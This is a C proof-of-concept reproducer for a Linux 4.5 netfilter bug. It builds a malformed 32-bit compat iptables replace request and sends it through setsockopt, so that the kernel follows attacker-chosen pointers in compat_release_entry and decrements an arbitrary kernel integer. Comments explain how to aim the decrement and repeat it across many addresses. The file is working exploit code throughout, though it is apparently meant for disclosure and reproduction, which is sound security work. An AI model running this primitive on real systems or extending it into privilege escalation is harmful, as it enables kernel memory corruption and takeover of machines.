/*
 * repro-compatReleaseEntryMod.c
 *    Trigger an arbitrary kernel decrement in compat_release_entry
 *
 * This has beent tested on Linux 4.5.
 *
 * Must be compiled with -m32:
 * gcc -m32 -static -g repro-compatReleaseEntryMod.c -o repro-compatReleaseEntryMod
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/if.h>
#define CONFIG_COMPAT
#include <linux/netfilter_ipv4/ip_tables.h>

typedef unsigned long long voidp64;

typedef unsigned int u32;
typedef unsigned short __16;
typedef unsigned int compat_uint_t;
typedef u32     compat_uptr_t;
typedef unsigned long long compat_u64;

/* this is an in-kernel-only structure, we just approximate it here  */
struct xt_match {
    voidp64 listnext, listprev;

    const char name[29];
    u_int8_t revision;

    voidp64 match_func;
    voidp64 checkentry_func;
    voidp64 destroy_func;

#ifdef CONFIG_COMPAT
    voidp64 compat_from_user_func;
    voidp64 compat_to_user_func;
#endif
    voidp64 me; // struct module * 

    voidp64 table; // char * 
    unsigned int matchsize;
#ifdef CONFIG_COMPAT
    unsigned int compatsize;
#endif
    unsigned int hooks;
    unsigned short proto;

    unsigned short family;
};

/* this is an in-kernel-only structure, we just approximate it here  */
struct xt_target {
    voidp64 listnext, listprev;

    const char name[29];
    u_int8_t revision; 
    
    voidp64 target_func;
    voidp64 checkentry_func;
    voidp64 destroy_func;
#ifdef CONFIG_COMPAT
    voidp64 compat_from_user_func;
    voidp64 compat_to_user_func;
#endif
    voidp64 me; // struct module *

    voidp64 table; // char *
    unsigned int targetsize;
#ifdef CONFIG_COMPAT
    unsigned int compatsize;
#endif
    unsigned int hooks;
    unsigned short proto;

    unsigned short family;
};

struct my_xt_entry_target {
    union {
        struct {
            u_int16_t target_size;
            char name[XT_FUNCTION_MAXNAMELEN - 1];
            u_int8_t revision;
        } user;
        struct {
            u_int16_t target_size;
            char padding[6];
            voidp64 target; // struct xt_target *
        } kernel;
        u_int16_t target_size;
    } u;
    unsigned char data[0];
};

struct compat_xt_counters {
    compat_u64 pcnt, bcnt;          /* Packet and byte counters */
};  

struct compat_ipt_entry {
    struct ipt_ip ip;
    compat_uint_t nfcache;
    __u16 target_offset;
    __u16 next_offset;
    compat_uint_t comefrom;
    struct compat_xt_counters counters;
    unsigned char elems[0];
};

struct compat_ipt_replace {
    char            name[XT_TABLE_MAXNAMELEN];
    u32         valid_hooks;
    u32         num_entries;
    u32         size;
    u32         hook_entry[NF_INET_NUMHOOKS];
    u32         underflow[NF_INET_NUMHOOKS];
    u32         num_counters;
    compat_uptr_t       counters;   /* struct xt_counters * */
    struct compat_ipt_entry entries[0];
} __attribute__ ((packed));

void
xperror(int bad, char *msg)
{
    if(bad) {
        perror(msg);
        exit(1);
    }
}

/* struct xt_entry_match with proper layout for -m32 */
struct my_xt_entry_match {
    union {
        struct {
            __u16 match_size;
            char name[XT_EXTENSION_MAXNAMELEN];
            __u8 revision;
        } user;
        struct {
            __u16 match_size; 
            char padding[6];
            voidp64 match; // struct xt_match *
        } kernel;
        __u16 match_size;
    } u;
    unsigned char data[0];
};

void
attack(int s, void *me1, void *me2)
{
    char buf[65 * 1024];
    struct ipt_replace repl;
    struct ipt_entry ent;
    struct my_xt_entry_target targ, targ2;
    struct xt_target myxttarg;
    struct my_xt_entry_match match;
    struct xt_match kernmatch;
    char *p;
    socklen_t valsz;
    int x;
    
    /* build [repl [ent match target ... target2]] */
    memset(&targ, 0, sizeof targ);
    targ.u.target_size = 0;

    memset(&myxttarg, 0, sizeof myxttarg);
    myxttarg.me = (voidp64)(uintptr_t)me2; // our me!

    memset(&targ2, 0, sizeof targ2);
    targ2.u.target_size = 0;
    targ2.u.kernel.target = (voidp64)(uintptr_t)&myxttarg; // we choose! fun!

    memset(&kernmatch, 0, sizeof kernmatch);
    kernmatch.me = (voidp64)(uintptr_t)me1; // our me!

    memset(&match, 0, sizeof match);
    strcpy(match.u.user.name, "icmp");
    match.u.kernel.match = (voidp64)(uintptr_t)&kernmatch; // we choose! fun!
    match.u.match_size = 65535; // consume all space till target_offset=65535
    /* 
     * if we wanted, we could include many more match records, each
     * decrementing a different kernel address.
     */

    memset(&ent, 0, sizeof ent);
    ent.next_offset = sizeof ent + sizeof match + sizeof targ;
    /*
     * this value of target_offset is too small.  It will cause
     * there to be no match entries when initializing the entry.
     * It will cause target->u.kernel.target to alias ent->target_offset,
     * which will overwritten e->target_offset with 0xfff after 
     * initializing the empty matches.  Later when the matches
     * are released by compat_release_entry() the matches will be
     * taken from the space immediately following the entry, which
     * will contain a user-provided match->u.kernel.match record
     * instead of the kernel provided match->u.kernel.match record!
     */
    ent.target_offset = 74;

    memset(&repl, 0, sizeof repl);
    repl.num_entries = 2; // intentionally wrong! we only provide one!
    repl.num_counters = 1;
    repl.size = sizeof repl + 65535 + sizeof targ;
    repl.valid_hooks = 0;

    p = buf;
    memcpy(p, &repl, sizeof repl);
    p += sizeof repl;
    memcpy(p, &ent, sizeof ent);
    p += sizeof ent;
    memcpy(p, &match, sizeof match);
    p += sizeof match;
    memcpy(p, &targ, sizeof targ);
    p += sizeof targ;

    p = buf + sizeof repl + 65535; // the target, after target_offset has been corrupted
    memcpy(p, &targ2, sizeof targ2);
    p += sizeof targ;
    valsz = repl.size; 

    //x = compat_setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, buf, valsz);
    x = setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, buf, valsz);
    printf("setsockopt returned %d\n", x);
}

void
linux4_decr(int s, void *p1, void *p2)
{
    /* pointer is directly in me */
    attack(s, p1, p2);
}

int 
main(int argc, char **argv)
{
    char huntbuf[4096];
    struct utsname name;
    void (*modfunc)(int, void *, void *);
    int x, s, off, decrTarget;
    
    x = uname(&name);
    xperror(x == -1, "uname");
    switch(name.release[0]) {
    case '4':
        printf("using linux4_decr\n");
        modfunc = linux4_decr;
        break;
    default:
        printf("unsupported version: %s\n", name.release);
        exit(1);
    }

    s = socket(AF_INET, SOCK_DGRAM, 0);
    xperror(s == -1, "socket");

    /* use the attack to find out the offset to the modified data */
    memset(huntbuf, 2, sizeof huntbuf);
    modfunc(s, huntbuf, huntbuf);
    for(off = 0; off < sizeof huntbuf; off++) {
        if(huntbuf[off] != 2)
            break;
    }
    if(off == sizeof huntbuf) {
        printf("offset not found!\n");
        return 1;
    }
    printf("offset %d\n", off);

    /* 
     * Use the attack to decrTarget by one (and huntbuf by one).
     * The decrement happens in kernel and could decrement
     * arbitrary kernel integers (if positive).
     */
    decrTarget = 10;
    printf("decrTarget %d\n", decrTarget);
    modfunc(s, (char *)&decrTarget - off, huntbuf);
    printf("decrTarget %d\n", decrTarget);

    return 0;
}

